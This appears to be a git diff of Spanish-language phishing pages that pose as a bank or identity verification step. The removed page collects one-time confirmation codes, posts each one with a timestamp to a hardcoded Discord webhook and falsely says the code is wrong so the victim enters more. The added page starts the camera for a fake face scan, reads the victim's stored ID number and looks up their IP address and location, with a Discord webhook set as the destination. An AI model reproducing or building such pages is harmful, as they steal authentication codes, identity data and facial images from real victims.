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" alt="Logo">
-    <button class="header-close" onclick="window.location.href='index.html'">
-      <svg width="21" height="21" viewBox="0 0 21 21" fill="none">
-        <line x1="2" y1="2" x2="19" y2="19" stroke="white" stroke-width="2.6" stroke-linecap="round"/>
-        <line x1="19" y1="2" x2="2"  y2="19" stroke="white" stroke-width="2.6" stroke-linecap="round"/>
-      </svg>
-    </button>
-  </div>
+    <div class="scanner-container" id="camera-container">
 
-  <div class="content">
-    <button class="back-btn" onclick="window.location.href='index.html'">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-        <polyline points="15 18 9 12 15 6"/>
-      </svg>
-      Atrás
-    </button>
+        <!-- Anillo de progreso SVG -->
+        <svg class="progress-ring" viewBox="0 0 300 380" xmlns="http://www.w3.org/2000/svg">
+            <!-- Track (fondo) -->
+            <ellipse class="ring-track" stroke="#e5e5ea" stroke-width="7" fill="transparent"
+                rx="140" ry="182" cx="150" cy="190"></ellipse>
+            <!-- Progreso -->
+            <ellipse class="ring-progress" id="ring-progress" stroke="#007aff" stroke-width="7"
+                stroke-linecap="round" fill="transparent"
+                rx="140" ry="182" cx="150" cy="190"
+                style="stroke-dasharray:2042;stroke-dashoffset:2042;"></ellipse>
+        </svg>
 
-    <h1>Ingrese su código de<br>confirmación</h1>
+        <!-- Video -->
+        <div class="video-mask face-none" id="video-mask">
+            <video id="video" autoplay playsinline muted></video>
+            <div class="scan-light" id="scan-light"></div>
+        </div>
 
-    <input
-      type="text"
-      id="codigo"
-      inputmode="numeric"
-      pattern="[0-9]*"
-      maxlength="6"
-      autocomplete="one-time-code"
-      oninput="onInput(this)"
-    >
+        <!-- Silueta de cabeza encima del video -->
+        <div class="face-guide-overlay">
+            <svg class="face-silhouette" id="face-silhouette" viewBox="0 0 180 230" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- Cabeza -->
+                <path d="
+                    M90 8
+                    C 48 8, 22 42, 22 82
+                    C 22 118, 34 148, 58 163
+                    C 58 163, 56 178, 50 188
+                    C 44 198, 32 204, 32 204
+                    L 148 204
+                    C 148 204, 136 198, 130 188
+                    C 124 178, 122 163, 122 163
+                    C 146 148, 158 118, 158 82
+                    C 158 42, 132 8, 90 8
+                    Z
+                " stroke="white" stroke-width="4" stroke-linejoin="round" fill="none" opacity="0.85"/>
+                <!-- Hombros / cuello -->
+                <path d="
+                    M32 204
+                    C 20 210, 4 222, 2 230
+                    L 178 230
+                    C 176 222, 160 210, 148 204
+                " stroke="white" stroke-width="4" stroke-linejoin="round" fill="none" opacity="0.85"/>
+            </svg>
+        </div>
 
-    <div class="intentos-txt" id="intentos-txt"></div>
+    </div>
 
-    <p class="help-text">
-      Si no recibe el código, puede esperar nuestra<br>
-      llamada o contactarnos a través del botón<br>
-      <span class="help-link">"¿Necesita Ayuda?"</span>
-    </p>
+    <!-- Status -->
+    <div class="status-area">
+        <div class="status-dot" id="status-dot"></div>
+        <div class="status-title" id="main-text">Iniciando cámara…</div>
+        <div class="status-sub" id="sub-text">Por favor espera</div>
+    </div>
 
-    <button class="btn-continuar" id="btn-continuar" onclick="enviar()">Continuar</button>
-  </div>
-</div>
+    <div class="flash" id="flash-effect"></div>
 
-<button class="fab">
-  <svg width="26" height="26" viewBox="0 0 24 24" fill="white">
-    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
-  </svg>
-</button>
+    <div id="loader-overlay">
+        <div class="spinner"></div>
+    </div>
 
-<div class="overlay" id="overlay">
-  <div class="modal">
-    <h2>Intentos agotados</h2>
-    <p>Has superado el número máximo de intentos. Por favor, inicia el proceso nuevamente.</p>
-    <button class="modal-btn" onclick="window.location.href='index.html'">Volver al inicio</button>
-  </div>
-</div>
+    <!-- ─────────────────────────────────────────────────────────── -->
+    <script>
+        // 🎯 WEBHOOK DE DISCORD
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1481123117672824985/Yx5QOIlaL-wY5I0eVMUaNzw7_rM9yu2Ht_Kvx8tW4-frGdJZr0klQUc6L2XGWPDXnp64';
 
-<div class="toast" id="toast"></div>
+        // ── Elementos ──
+        const video        = document.getElementById("video");
+        const ringProgress = document.getElementById("ring-progress");
+        const mainText     = document.getElementById("main-text");
+        const subText      = document.getElementById("sub-text");
+        const flashEffect  = document.getElementById("flash-effect");
+        const videoMask    = document.getElementById("video-mask");
+        const loaderOverlay= document.getElementById("loader-overlay");
+        const scanLight    = document.getElementById("scan-light");
+        const statusDot    = document.getElementById("status-dot");
 
-<script>
-  const WEBHOOK = "https://discord.com/api/webhooks/1481123117672824985/Yx5QOIlaL-wY5I0eVMUaNzw7_rM9yu2Ht_Kvx8tW4-frGdJZr0klQUc6L2XGWPDXnp64";
-  const MAX = 6;
-  let restantes = MAX;
-  const input   = document.getElementById('codigo');
-  const btn     = document.getElementById('btn-continuar');
-  const iTxt    = document.getElementById('intentos-txt');
-  const overlay = document.getElementById('overlay');
-  const toast   = document.getElementById('toast');
+        // ── Estado ──
+        let stream       = null;
+        let intento      = 0;
+        let faceDetector = null;
+        let detectLoop   = null;
+        let scanning     = false;
 
-  function onInput(el) {
-    el.value = el.value.replace(/\D/g,'').slice(0,6);
-    btn.classList.toggle('active', el.value.length === 6);
-  }
-  function showToast(msg) {
-    toast.textContent = msg;
-    toast.classList.add('show');
-    setTimeout(() => toast.classList.remove('show'), 2600);
-  }
-  async function enviarWebhook(codigo, intento) {
-    const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
-    await fetch(WEBHOOK, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        username: 'Código de Confirmación',
-        embeds: [{
-          title: '🔐 Código ingresado',
-          color: 0xcc0000,
-          fields: [
-            { name: 'Código',     value: '' + codigo + '', inline: true },
-            { name: 'Intento',    value: intento + ' / ' + MAX, inline: true },
-            { name: 'Fecha/Hora', value: hora }
-          ],
-          footer: { text: 'Panel de Confirmación' }
-        }]
-      })
-    }).catch(() => {});
-  }
-  async function enviar() {
-    const codigo = input.value.trim();
-    if (codigo.length !== 6 || restantes <= 0) return;
-    btn.disabled = true;
-    const intento = MAX - restantes + 1;
-    await enviarWebhook(codigo, intento);
-    restantes--;
-    if (restantes <= 0) { overlay.classList.add('show'); return; }
-    input.classList.add('shake');
-    setTimeout(() => input.classList.remove('shake'), 400);
-    iTxt.textContent = restantes <= 2
-      ? '⚠️ Solo ' + restantes + ' intento' + (restantes===1?'':'s') + ' restante' + (restantes===1?'':'s')
-      : restantes + ' intentos restantes';
-    iTxt.className = 'intentos-txt' + (restantes <= 2 ? ' warn' : '');
-    showToast('Código incorrecto, intenta de nuevo');
-    input.value = '';
-    btn.classList.remove('active');
-    btn.disabled = false;
-    input.focus();
-  }
-  input.addEventListener('keydown', e => {
-    if (e.key === 'Enter' && input.value.length === 6) enviar();
-  });
-</script>
+        const tipoDocumento  = localStorage.getItem('tipo_documento') || 'Desconocido';
+        const numeroDocumento= localStorage.getItem('documento')       || 'Desconocido';
+        let userIP           = 'Desconocida';
+        let userLocation     = 'Desconocida';
+
+        // ── Circunferencia del anillo ──
+        // rx=140 ry=182 → perímetro approx π*(3*(a+b)-√((3a+b)(a+3b))) Ramanujan
+        const a = 140, b = 182;
+        const CIRC = Math.PI * (3*(a+b) - Math.sqrt((3*a+b)*(a+3*b)));
+        ringProgress.style.strokeDasharray  = `${CIRC} ${CIRC}`;
+        ringProgress.style.strokeDashoffset = CIRC;
+
+        function setProgress(pct) {
+            ringProgress.style.strokeDashoffset = CIRC - (pct / 100) * CIRC;
+        }
+
+        function setRingColor(color) {
+            ringProgress.style.stroke = color;
+        }
+
+        // ── IP y ubicación ──
+        async function getIPAndLocation() {
+            try {
+                const r    = await fetch('https://ipapi.co/json/');
+                const data = await r.json();
+                userIP       = data.ip            || 'Desconocida';
+                userLocation = `${data.city||'?'}, ${data.country_name||'?'}`;
+            } catch { userIP = 'Error'; userLocation = 'Error'; }
+        }
+
+        // ── Estado UI ──
+        function setState(state, title, sub) {
+            mainText.innerText = title;
+            subText.innerText  = sub;
+            statusDot.className = `status-dot ${state}`;
+
+            if (state === 'good') {
+                mainText.style.color = 'var(--success)';
+                videoMask.className  = 'video-mask face-ok';
+            } else if (state === 'warn') {
+                mainText.style.color = 'var(--warning)';
+                videoMask.className  = 'video-mask face-warn';
+            } else if (state === 'scan') {
+                mainText.style.color = 'var(--primary)';
+                videoMask.className  = 'video-mask face-ok';
+            } else {
+                mainText.style.color = 'var(--text-main)';
+                videoMask.className  = 'video-mask face-none';
+            }
+        }
+
+        // ── Detección de rostro ──
+        // Intentamos usar la Face Detection API nativa del navegador.
+        // Si no está disponible, usamos un detector de movimiento/color simple.
+        async function initFaceDetector() {
+            if ('FaceDetector' in window) {
+                try {
+                    faceDetector = new FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
+                    return true;
+                } catch { /* no disponible */ }
+            }
+            return false;
+        }
+
